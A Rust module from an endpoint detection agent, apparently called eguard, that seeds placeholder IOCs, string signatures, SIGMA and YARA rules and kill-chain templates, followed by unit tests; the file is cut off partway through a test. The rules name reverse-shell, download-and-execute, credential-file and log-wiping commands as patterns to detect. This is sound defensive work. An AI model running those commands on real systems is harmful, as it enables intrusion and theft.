use std::fs;
use std::io::BufReader;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};

use detection::{
    DetectionEngine, IocExactStore, KillChainTemplate, RansomwarePolicy, TemplatePredicate,
};
use tracing::{info, warn};

use crate::config::AgentConfig;

#[derive(Debug, Clone)]
pub(super) struct DetectionSourcePaths {
    pub sigma_dir: PathBuf,
    pub yara_dir: PathBuf,
    pub ioc_dir: PathBuf,
    pub control_plane_peers: Vec<(String, u16)>,
}

impl DetectionSourcePaths {
    pub(super) fn from_config(config: &AgentConfig) -> Self {
        Self {
            sigma_dir: PathBuf::from(config.detection_sigma_rules_dir.clone()),
            yara_dir: PathBuf::from(config.detection_yara_rules_dir.clone()),
            ioc_dir: PathBuf::from(config.detection_ioc_dir.clone()),
            control_plane_peers: configured_control_plane_peers(&config.server_addr),
        }
    }
}

fn configured_control_plane_peers(server: &str) -> Vec<(String, u16)> {
    use std::net::ToSocketAddrs;
    let url = if server.contains("://") {
        server.to_string()
    } else {
        format!("http://{server}")
    };
    let Ok(url) = reqwest::Url::parse(&url) else {
        return Vec::new();
    };
    let (Some(host), Some(port)) = (url.host_str(), url.port_or_known_default()) else {
        return Vec::new();
    };
    let host = host
        .trim_matches(['[', ']'])
        .trim_end_matches('.')
        .to_ascii_lowercase();
    let mut peers = vec![(host.clone(), port)];
    if let Ok(addresses) = (host.as_str(), port).to_socket_addrs() {
        peers.extend(addresses.map(|address| (address.ip().to_string(), port)));
    }
    // Same explicitly supported alternate endpoint as grpc-client.
    if port == 50052 {
        peers.extend(peers.clone().into_iter().map(|(host, _)| (host, 50053)));
    }
    peers.sort();
    peers.dedup();
    peers
}

pub(super) fn build_detection_engine_with_ransomware_policy(
    policy: RansomwarePolicy,
    sources: &DetectionSourcePaths,
) -> DetectionEngine {
    let mut detection = DetectionEngine::default_with_rules();
    configure_low_memory_ioc_exact_store(&mut detection, low_memory_ioc_exact_store_enabled());
    detection.layer4 =
        detection::Layer4Engine::with_capacity_and_policy(300, 8_192, 32_768, policy);
    seed_ioc_hashes(&mut detection);
    seed_ioc_domains(&mut detection);
    seed_ioc_ips(&mut detection);
    seed_string_signatures(&mut detection);
    seed_sigma_rules(&mut detection, &sources.sigma_dir);
    seed_yara_rules(&mut detection, &sources.yara_dir);
    seed_kill_chain_templates(&mut detection);
    load_ioc_files(&mut detection, &sources.ioc_dir);
    detection
        .layer4
        .configure_control_plane(std::process::id(), sources.control_plane_peers.clone());
    detection
}

static IOC_EXACT_STORE_SEQUENCE: AtomicU64 = AtomicU64::new(1);

fn low_memory_ioc_exact_store_enabled() -> bool {
    match std::env::var("EGUARD_FORCE_LOW_MEMORY_IOC_STORE") {
        Ok(raw) => matches!(
            raw.trim().to_ascii_lowercase().as_str(),
            "1" | "true" | "yes" | "on"
        ),
        Err(_) => super::host_is_low_memory(super::linux_host_mem_total_bytes()),
    }
}

fn configure_low_memory_ioc_exact_store(detection: &mut DetectionEngine, enabled: bool) {
    if !enabled {
        return;
    }

    let staging_root = super::resolve_rules_staging_root();
    if let Err(err) = fs::create_dir_all(&staging_root) {
        warn!(
            error = %err,
            path = %staging_root.display(),
            "failed preparing low-memory IOC exact-store directory"
        );
        return;
    }

    cleanup_stale_ioc_exact_store_files(&staging_root);
    let sequence = IOC_EXACT_STORE_SEQUENCE.fetch_add(1, Ordering::Relaxed);
    let path = staging_root.join(format!(
        "ioc-exact-store-{}-{}.sqlite",
        std::process::id(),
        sequence
    ));

    match IocExactStore::open_ephemeral(&path) {
        Ok(store) => {
            detection.layer1.enable_exact_store_only(store);
            info!(
                path = %path.display(),
                "enabled low-memory Layer1 exact-store mode"
            );
        }
        Err(err) => {
            warn!(
                error = %err,
                path = %path.display(),
                "failed enabling low-memory Layer1 exact-store mode; using in-memory prefilter"
            );
        }
    }
}

fn cleanup_stale_ioc_exact_store_files(staging_root: &Path) {
    let current_pid = std::process::id().to_string();
    let entries = match fs::read_dir(staging_root) {
        Ok(entries) => entries,
        Err(_) => return,
    };

    for entry in entries.flatten() {
        let path = entry.path();
        let Some(name) = path.file_name().and_then(|value| value.to_str()) else {
            continue;
        };
        if !name.starts_with("ioc-exact-store-") || name.contains(&format!("-{}-", current_pid)) {
            continue;
        }

        let _ = fs::remove_file(&path);
    }
}

// ── Layer 1: IOC Hashes ─────────────────────────────────────────
fn seed_ioc_hashes(detection: &mut DetectionEngine) {
    detection.layer1.load_hashes([
        // EICAR test file SHA-256
        "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f".to_string(),
        // Placeholder for real malware hashes (loaded from rules/ioc/ at runtime)
        "deadbeef".to_string(),
    ]);
}

// ── Layer 1: IOC Domains ────────────────────────────────────────
fn seed_ioc_domains(detection: &mut DetectionEngine) {
    detection.layer1.load_domains([
        "known-c2.example.com".to_string(),
        "evil-c2-domain.example.com".to_string(),
        // Common test/simulation C2 domains
        "malware-callback.example.net".to_string(),
    ]);
}

// ── Layer 1: IOC IPs ────────────────────────────────────────────
fn seed_ioc_ips(detection: &mut DetectionEngine) {
    detection.layer1.load_ips([
        // RFC 5737 documentation ranges (used for testing)
        "198.51.100.10".to_string(),
        "203.0.113.10".to_string(),
        // Feodo Tracker / known C2 placeholder
        "192.0.2.1".to_string(),
    ]);
}

// ── Layer 1: Aho-Corasick String Signatures ─────────────────────
fn seed_string_signatures(detection: &mut DetectionEngine) {
    detection.layer1.load_string_signatures([
        // Download-and-execute patterns
        "curl|bash".to_string(),
        "curl | bash".to_string(),
        "wget|bash".to_string(),
        "wget | bash".to_string(),
        "curl|sh".to_string(),
        "wget|sh".to_string(),
        // Reverse shell patterns
        ">& /dev/tcp/".to_string(),
        "bash -i".to_string(),
        "nc -e /bin".to_string(),
        "ncat -e /bin".to_string(),
        // Crypto mining
        "xmrig".to_string(),
        "stratum+tcp://".to_string(),
        "stratum+ssl://".to_string(),
        "minerd".to_string(),
        "cpuminer".to_string(),
        "cryptonight".to_string(),
        // Anti-forensics
        "rm -rf /var/log".to_string(),
    ]);
    detection.layer1.load_string_features([
        // Ordinary interpreter, administration and transfer syntax is context only.
        "python -c".to_string(),
        "python3 -c".to_string(),
        "perl -e".to_string(),
        "ruby -e".to_string(),
        "powershell -enc".to_string(),
        "powershell -e ".to_string(),
        "mkfifo /tmp/".to_string(),
        "base64 -d".to_string(),
        "base64 --decode".to_string(),
        "/etc/shadow".to_string(),
        "/etc/sudoers".to_string(),
        "passwd --stdin".to_string(),
        "insmod ".to_string(),
        "modprobe ".to_string(),
        "crontab ".to_string(),
        "systemctl enable".to_string(),
        "ssh root@".to_string(),
        "curl -x post".to_string(),
        "curl --upload".to_string(),
        "-o /tmp/".to_string(),
        "-O /tmp/".to_string(),
        "| bash".to_string(),
        "| sh".to_string(),
        "|bash".to_string(),
        "|sh".to_string(),
        "history -c".to_string(),
        "shred ".to_string(),
    ]);
}

// ── Layer 2: SIGMA Temporal Rules ───────────────────────────────
fn seed_sigma_rules(detection: &mut DetectionEngine, configured_dir: &Path) {
    let rules: &[(&str, &str)] = &[
        ("builtin_webshell", SIGMA_WEBSHELL),
        ("builtin_reverse_shell", SIGMA_REVERSE_SHELL),
        ("builtin_download_exec", SIGMA_DOWNLOAD_EXEC),
        ("builtin_privesc", SIGMA_PRIVESC),
        ("builtin_kernel_module", SIGMA_KERNEL_MODULE),
        ("builtin_persistence", SIGMA_PERSISTENCE),
        ("builtin_lateral_movement", SIGMA_LATERAL_MOVEMENT),
        ("builtin_sensitive_file", SIGMA_SENSITIVE_FILE),
        ("builtin_data_exfil", SIGMA_DATA_EXFIL),
        ("builtin_win_reg_save_sam", SIGMA_WIN_REG_SAVE_SAM),
        (
            "builtin_win_ps_download_cradle",
            SIGMA_WIN_PS_DOWNLOAD_CRADLE,
        ),
        (
            "builtin_win_shadow_copy_delete",
            SIGMA_WIN_SHADOW_COPY_DELETE,
        ),
        ("builtin_win_event_log_clear", SIGMA_WIN_EVENT_LOG_CLEAR),
        ("builtin_win_schtask_creation", SIGMA_WIN_SCHTASK_CREATION),
        ("builtin_win_service_creation", SIGMA_WIN_SERVICE_CREATION),
    ];

    let mut loaded = 0usize;
    for (label, yaml) in rules {
        match detection.load_sigma_rule_yaml(yaml) {
            Ok(_) => loaded += 1,
            Err(err) => warn!(rule = %label, error = %err, "failed loading built-in SIGMA rule"),
        }
    }

    for rules_dir in configured_or_fallback_dirs(configured_dir, Path::new("rules/sigma")) {
        if !rules_dir.exists() {
            continue;
        }
        match detection.load_sigma_rules_from_dir(&rules_dir) {
            Ok(count) => loaded += count,
            Err(err) => {
                warn!(error = %err, path = %rules_dir.display(), "failed loading SIGMA rules from directory")
            }
        }
    }

    info!(loaded_sigma_rules = loaded, "SIGMA rules initialized");
}

// ── Webshell: web server spawns shell that makes outbound connection ──
const SIGMA_WEBSHELL: &str = r#"
title: eguard_builtin_webshell
detection:
  sequence:
    - event_class: process_exec
      process_any_of: [bash, sh, dash, zsh, python, python3, perl, php]
      parent_any_of: [nginx, apache2, httpd, caddy, lighttpd, php-fpm]
      within_secs: 30
    - event_class: network_connect
      dst_port_not_in: [80, 443]
      within_secs: 10
"#;

// ── Reverse shell: require shell-I/O evidence, not just a shell + network ──
const SIGMA_REVERSE_SHELL: &str = r#"
title: eguard_builtin_reverse_shell
detection:
  sequence:
    - event_class: process_exec
      process_any_of: [bash, sh, dash, zsh, nc, ncat, socat]
      command_line_contains: ['>& /dev/tcp/', 'nc -e /bin', 'ncat -e', 'socat exec', '0<&196']
      within_secs: 60
    - event_class: network_connect
      within_secs: 5
"#;

// ── Download & execute: curl/wget followed by shell ──
const SIGMA_DOWNLOAD_EXEC: &str = r#"
title: eguard_builtin_download_exec
detection:
  sequence:
    - event_class: process_exec
      process_any_of: [curl, wget]
      within_secs: 60
    - event_class: process_exec
      process_any_of: [bash, sh, python, python3, perl, chmod]
      within_secs: 10
"#;

// ── Privilege escalation: elevation tool followed by its root interpreter ──
const SIGMA_PRIVESC: &str = r#"
title: eguard_builtin_privesc
detection:
  sequence:
    - event_class: process_exec
      process_any_of: [sudo, su, pkexec]
      uid_ne: 0
      within_secs: 60
    - event_class: process_exec
      process_any_of: [bash, sh, dash, zsh, ksh, python, python3, perl, ruby]
      parent_any_of: [sudo, su, pkexec]
      uid_eq: 0
      within_secs: 20
"#;

// ── Suspicious kernel module load ──
const SIGMA_KERNEL_MODULE: &str = r#"
title: eguard_builtin_kernel_module
detection:
  sequence:
    - event_class: module_load
      within_secs: 300
"#;

// ── Persistence via cron or systemd ──
const SIGMA_PERSISTENCE: &str = r#"
title: eguard_builtin_persistence
detection:
  sequence:
    - event_class: process_exec
      process_any_of: [crontab, systemctl, at]
      within_secs: 120
    - event_class: file_open
      file_path_contains: [/etc/cron, /etc/systemd/system/, /etc/init.d/, .bashrc, .profile, /etc/profile.d/]
      require_file_write: true
      within_secs: 10
"#;

// ── Lateral movement: SSH or SMB ──
const SIGMA_LATERAL_MOVEMENT: &str = r#"
title: eguard_builtin_lateral_movement
detection:
  sequence:
    - event_class: process_exec
      process_any_of: [ssh, scp, rsync, smbclient, psexec, impacket]
      within_secs: 120
    - event_class: network_connect
      within_secs: 10
"#;

// ── Sensitive file access ──
const SIGMA_SENSITIVE_FILE: &str = r#"
title: eguard_builtin_sensitive_file_access
detection:
  sequence:
    - event_class: file_open
      uid_ne: 0
      process_any_of: [
        cat,
        grep,
        awk,
        sed,
        strings,
        xxd,
        hexdump,
        head,
        tail,
        less,
        more,
        cp,
        tar,
        rsync,
        scp,
        bash,
        sh,
        dash,
        zsh,
        fish,
        python,
        python3,
        perl,
        ruby,
        php,
        sqlite3,
        security,
        plutil,
        powershell.exe,
        pwsh.exe,
        cmd.exe,
        reg.exe,
        rundll32.exe,
        certutil.exe,
        mshta.exe,
        wscript.exe,
        cscript.exe,
        mimikatz.exe
      ]
      file_path_any_of: [
        /etc/shadow,
        /etc/gshadow,
        /etc/master.passwd,
        /root/.ssh/id_rsa,
        C:\Windows\System32\config\SAM,
        C:\Windows\System32\config\SECURITY,
        C:\Windows\System32\config\SYSTEM,
        C:\Windows\NTDS\ntds.dit,
        /Library/Keychains/System.keychain
      ]
      file_path_contains: [
        '/.ssh/id_',
        '/.aws/credentials',
        '.aws\\credentials',
        'keepass',
        'keychain',
        'ntds.dit'
      ]
      within_secs: 300
"#;

// ── Credential exfiltration candidate: sensitive file access + network ──
const SIGMA_DATA_EXFIL: &str = r#"
title: eguard_builtin_data_exfil
detection:
  sequence:
    - event_class: file_open
      file_path_any_of: [/etc/shadow, /etc/gshadow, /etc/master.passwd]
      file_path_contains: ['/.ssh/id_', '/.aws/credentials', '/.kube/config']
      within_secs: 60
    - event_class: network_connect
      within_secs: 15
"#;

const SIGMA_WIN_REG_SAVE_SAM: &str = r#"
title: eguard_win_reg_save_sam
logsource:
  product: windows
  service: security

detection:
  selection:
    Image|endswith:
      - '\\reg.exe'
      - '\\reg'
    CommandLine|contains:
      - 'save hklm\\sam'
      - 'save hklm\\system'
      - 'save hklm\\security'
  condition: selection
"#;

const SIGMA_WIN_PS_DOWNLOAD_CRADLE: &str = r#"
title: eguard_win_ps_download_cradle
logsource:
  product: windows
  service: powershell

detection:
  selection:
    Image|endswith:
      - '\\powershell.exe'
      - '\\pwsh.exe'
    CommandLine|contains:
      - 'downloadstring'
      - 'downloadfile'
      - 'invoke-expression'
      - 'iex '
      - 'new-object net.webclient'
  condition: selection
"#;

const SIGMA_WIN_SHADOW_COPY_DELETE: &str = r#"
title: eguard_win_shadow_copy_delete
logsource:
  product: windows
  service: process_creation

detection:
  selection:
    CommandLine|contains:
      - 'vssadmin delete shadows'
      - 'wmic shadowcopy delete'
      - 'wbadmin delete catalog'
  condition: selection
"#;

const SIGMA_WIN_EVENT_LOG_CLEAR: &str = r#"
title: eguard_win_event_log_clear
logsource:
  product: windows
  service: process_creation

detection:
  selection:
    CommandLine|contains:
      - 'wevtutil cl'
      - 'clear-eventlog'
  condition: selection
"#;

const SIGMA_WIN_SCHTASK_CREATION: &str = r#"
title: eguard_win_schtask_creation
logsource:
  product: windows
  service: process_creation

detection:
  selection:
    Image|endswith:
      - '\\schtasks.exe'
      - '\\schtasks'
    CommandLine|contains:
      - '/create'
      - '/ru system'
      - '/sc onlogon'
  condition: selection
"#;

const SIGMA_WIN_SERVICE_CREATION: &str = r#"
title: eguard_win_service_creation_suspicious
logsource:
  product: windows
  service: process_creation

detection:
  selection:
    Image|endswith:
      - '\\sc.exe'
      - '\\sc'
    CommandLine|contains:
      - ' create '
      - 'binpath='
      - 'powershell'
      - 'cmd /c'
  condition: selection
"#;

// ── Layer 3: YARA Rules ─────────────────────────────────────────
fn seed_yara_rules(detection: &mut DetectionEngine, configured_dir: &Path) {
    const YARA_RULES: &str = r#"
rule eguard_builtin_test_marker {
  strings:
    $marker = "eguard-malware-test-marker"
  condition:
    $marker
}

rule eguard_eicar_test {
  strings:
    $eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}" ascii
  condition:
    $eicar
}

rule eguard_shellcode_marker {
  strings:
    $marker = "eguard-shellcode-marker"
  condition:
    $marker
}
"#;

    let mut loaded = 0usize;
    match detection.load_yara_rules_str(YARA_RULES) {
        Ok(count) => loaded += count,
        Err(err) => warn!(error = %err, "failed loading built-in YARA rules"),
    }

    for rules_dir in configured_or_fallback_dirs(configured_dir, Path::new("rules/yara")) {
        if !rules_dir.exists() {
            continue;
        }
        match detection.load_yara_rules_from_dir(&rules_dir) {
            Ok(count) => loaded += count,
            Err(err) => {
                warn!(error = %err, path = %rules_dir.display(), "failed loading YARA rules from directory")
            }
        }
    }

    info!(loaded_yara_rules = loaded, "YARA rules initialized");
}

// ── Layer 4: Kill Chain Templates ───────────────────────────────
fn seed_kill_chain_templates(detection: &mut DetectionEngine) {
    use detection::util::set_of;

    // Data theft chain: sensitive file read → outbound connection
    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_data_theft".to_string(),
        stages: vec![
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: true,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
            TemplatePredicate {
                process_any_of: Some(set_of(["curl", "wget", "python", "python3", "nc", "ncat"])),
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: true,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
        ],
        max_depth: 6,
        max_inter_stage_secs: 60,
    });

    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_credential_theft".to_string(),
        stages: vec![TemplatePredicate {
            process_any_of: None,
            uid_eq: None,
            uid_ne: Some(0),
            require_network_non_web: false,
            require_module_loaded: false,
            require_sensitive_file_access: true,
            require_ransomware_write_burst: false,
            require_container_escape: false,
            require_privileged_container: false,
            require_ptrace_activity: false,
            require_userfaultfd_activity: false,
            require_execveat_activity: false,
            require_proc_mem_access: false,
            require_fileless_exec: false,
        }],
        max_depth: 2,
        max_inter_stage_secs: 10,
    });

    // Lateral movement chain: SSH/SCP connection
    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_lateral_ssh".to_string(),
        stages: vec![
            TemplatePredicate {
                process_any_of: Some(set_of(["ssh", "scp", "rsync"])),
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: true,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
        ],
        max_depth: 4,
        max_inter_stage_secs: 30,
    });

    // Reverse-shell template is gated on same-process socket-to-stdio witnesses in L4.
    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_reverse_shell".to_string(),
        stages: vec![
            TemplatePredicate {
                process_any_of: Some(set_of(["bash", "sh", "dash", "zsh"])),
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: true,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
        ],
        max_depth: 4,
        max_inter_stage_secs: 10,
    });

    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_container_escape".to_string(),
        stages: vec![TemplatePredicate {
            process_any_of: None,
            uid_eq: None,
            uid_ne: None,
            require_network_non_web: false,
            require_module_loaded: false,
            require_sensitive_file_access: false,
            require_ransomware_write_burst: false,
            require_container_escape: true,
            require_privileged_container: false,
            require_ptrace_activity: false,
            require_userfaultfd_activity: false,
            require_execveat_activity: false,
            require_proc_mem_access: false,
            require_fileless_exec: false,
        }],
        max_depth: 2,
        max_inter_stage_secs: 10,
    });

    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_container_privileged".to_string(),
        stages: vec![TemplatePredicate {
            process_any_of: None,
            uid_eq: None,
            uid_ne: None,
            require_network_non_web: false,
            require_module_loaded: false,
            require_sensitive_file_access: false,
            require_ransomware_write_burst: false,
            require_container_escape: false,
            require_privileged_container: true,
            require_ptrace_activity: false,
            require_userfaultfd_activity: false,
            require_execveat_activity: false,
            require_proc_mem_access: false,
            require_fileless_exec: false,
        }],
        max_depth: 2,
        max_inter_stage_secs: 10,
    });

    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_exploit_ptrace_fileless".to_string(),
        stages: vec![
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: true,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: true,
            },
        ],
        max_depth: 6,
        max_inter_stage_secs: 20,
    });

    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_exploit_userfaultfd_execveat".to_string(),
        stages: vec![
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: true,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: true,
                require_proc_mem_access: false,
                require_fileless_exec: false,
            },
        ],
        max_depth: 6,
        max_inter_stage_secs: 20,
    });

    detection.layer4.add_template(KillChainTemplate {
        name: "killchain_exploit_proc_mem_fileless".to_string(),
        stages: vec![
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: true,
                require_fileless_exec: false,
            },
            TemplatePredicate {
                process_any_of: None,
                uid_eq: None,
                uid_ne: None,
                require_network_non_web: false,
                require_module_loaded: false,
                require_sensitive_file_access: false,
                require_ransomware_write_burst: false,
                require_container_escape: false,
                require_privileged_container: false,
                require_ptrace_activity: false,
                require_userfaultfd_activity: false,
                require_execveat_activity: false,
                require_proc_mem_access: false,
                require_fileless_exec: true,
            },
        ],
        max_depth: 6,
        max_inter_stage_secs: 20,
    });
}

fn configured_or_fallback_dirs(configured_dir: &Path, fallback_dir: &Path) -> Vec<PathBuf> {
    let mut out = Vec::new();

    if !configured_dir.as_os_str().is_empty() {
        out.push(configured_dir.to_path_buf());
    }

    if fallback_dir != configured_dir {
        out.push(fallback_dir.to_path_buf());
    }

    out
}

// ── Load IOC files from rules/ioc/ directory ────────────────────
fn load_ioc_files(detection: &mut DetectionEngine, configured_dir: &Path) {
    for ioc_dir in configured_or_fallback_dirs(configured_dir, Path::new("rules/ioc")) {
        if !ioc_dir.exists() {
            continue;
        }

        // hashes.txt — one SHA-256 per line
        let hashes_path = ioc_dir.join("hashes.txt");
        if hashes_path.exists() {
            if let Ok(file) = fs::File::open(&hashes_path) {
                let count = detection
                    .layer1
                    .load_hashes_from_reader(BufReader::new(file));
                if count > 0 {
                    info!(count, path = %hashes_path.display(), "loaded IOC hashes from file");
                }
            }
        }

        // domains.txt — one domain per line
        let domains_path = ioc_dir.join("domains.txt");
        if domains_path.exists() {
            if let Ok(file) = fs::File::open(&domains_path) {
                let count = detection
                    .layer1
                    .load_domains_from_reader(BufReader::new(file));
                if count > 0 {
                    info!(count, path = %domains_path.display(), "loaded IOC domains from file");
                }
            }
        }

        // ips.txt — one IP per line
        let ips_path = ioc_dir.join("ips.txt");
        if ips_path.exists() {
            if let Ok(file) = fs::File::open(&ips_path) {
                let count = detection.layer1.load_ips_from_reader(BufReader::new(file));
                if count > 0 {
                    info!(count, path = %ips_path.display(), "loaded IOC IPs from file");
                }
            }
        }
    }
}

#[cfg(test)]
#[path = "tests_agentfix27.rs"]
mod tests_agentfix27;

#[cfg(test)]
mod tests {
    use super::{
        build_detection_engine_with_ransomware_policy, configured_or_fallback_dirs,
        DetectionSourcePaths,
    };
    use detection::{EventClass, Layer1Result, RansomwarePolicy, TelemetryEvent};
    use std::time::{SystemTime, UNIX_EPOCH};

    fn unique_temp_dir(label: &str) -> std::path::PathBuf {
        let nonce = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("system clock before unix epoch")
            .as_nanos();
        std::env::temp_dir().join(format!(
            "eguard-detection-bootstrap-{}-{}-{}",
            label,
            std::process::id(),
            nonce
        ))
    }

    fn base_event() -> TelemetryEvent {
        TelemetryEvent {
            ts_unix: 1_700_000_000,
            event_class: EventClass::ProcessExec,
            pid: 4242,
            ppid: 1,
            uid: 1000,
            process: "bash".to_string(),
            parent_process: "nginx".to_string(),
            session_id: 1,
            file_path: None,
            file_write: false,
            file_hash: None,
            dst_port: None,
            dst_ip: None,
            dst_domain: None,
            command_line: None,
            event_size: None,
            container_runtime: None,
            container_id: None,
            container_escape: false,
            container_privileged: false,
        }
    }

    #[test]
    fn configured_or_fallback_dirs_prefers_configured_then_relative_fallback() {
        let configured = std::path::Path::new("/opt/eguard/rules/yara");
        let dirs = configured_or_fallback_dirs(configured, std::path::Path::new("rules/yara"));
        assert_eq!(dirs.len(), 2);
        assert_eq!(dirs[0], configured);
        assert_eq!(dirs[1], std::path::Path::new("rules/yara"));
    }

    #[test]
    fn bootstrap_loads_sigma_rules_from_configured_directory() {
        let base = unique_temp_dir("sigma");
        let sigma_dir = base.join("sigma");
        let yara_dir = base.join("yara");
        let ioc_dir = base.join("ioc");
        std::fs::create_dir_all(&sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&ioc_dir).expect("create ioc dir");
        std::fs::write(
            sigma_dir.join("custom.yml"),
            r#"
title: sigma_custom_runtime_rule
detection:
  sequence:
    - event_class: process_exec
      process_any_of: [bash]
      parent_any_of: [nginx]
      within_secs: 30
    - event_class: network_connect
      dst_port_not_in: [80, 443]
      within_secs: 10
"#,
        )
        .expect("write sigma rule");

        let sources = DetectionSourcePaths {
            sigma_dir,
            yara_dir,
            ioc_dir,
            control_plane_peers: Vec::new(),
        };
        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);

        let first = base_event();
        let mut second = base_event();
        second.ts_unix += 1;
        second.event_class = EventClass::NetworkConnect;
        second.dst_port = Some(8443);

        let _ = engine.process_event(&first);
        let outcome = engine.process_event(&second);
        assert!(outcome
            .temporal_hits
            .iter()
            .any(|hit| hit == "sigma_custom_runtime_rule"));

        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_loads_yara_rules_from_configured_directory() {
        let base = unique_temp_dir("yara");
        let sigma_dir = base.join("sigma");
        let yara_dir = base.join("yara");
        let ioc_dir = base.join("ioc");
        std::fs::create_dir_all(&sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&ioc_dir).expect("create ioc dir");
        std::fs::write(
            yara_dir.join("custom.yar"),
            r#"
rule eguard_custom_dir_test {
  strings:
    $marker = "eguard-custom-yara-marker"
  condition:
    $marker
}
"#,
        )
        .expect("write yara rule");

        let sample_path = base.join("sample.bin");
        std::fs::write(&sample_path, b"eguard-custom-yara-marker").expect("write sample");

        let sources = DetectionSourcePaths {
            sigma_dir,
            yara_dir,
            ioc_dir,
            control_plane_peers: Vec::new(),
        };
        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);

        let mut event = base_event();
        event.event_class = EventClass::FileOpen;
        event.file_path = Some(sample_path.to_string_lossy().to_string());

        let outcome = engine.process_event(&event);
        assert!(outcome
            .yara_hits
            .iter()
            .any(|hit| hit.rule_name == "eguard_custom_dir_test"));

        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn bootstrap_loads_iocs_from_configured_directory() {
        let base = unique_temp_dir("ioc");
        let sigma_dir = base.join("sigma");
        let yara_dir = base.join("yara");
        let ioc_dir = base.join("ioc");
        std::fs::create_dir_all(&sigma_dir).expect("create sigma dir");
        std::fs::create_dir_all(&yara_dir).expect("create yara dir");
        std::fs::create_dir_all(&ioc_dir).expect("create ioc dir");
        let custom_hash = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
        std::fs::write(ioc_dir.join("hashes.txt"), format!("{custom_hash}\n"))
            .expect("write hash IOC file");

        let sources = DetectionSourcePaths {
            sigma_dir,
            yara_dir,
            ioc_dir,
            control_plane_peers: Vec::new(),
        };
        let mut engine =
            build_detection_engine_with_ransomware_policy(RansomwarePolicy::default(), &sources);

        let mut event = base_event();
        event.file_hash = Some(custom_hash.to_string());

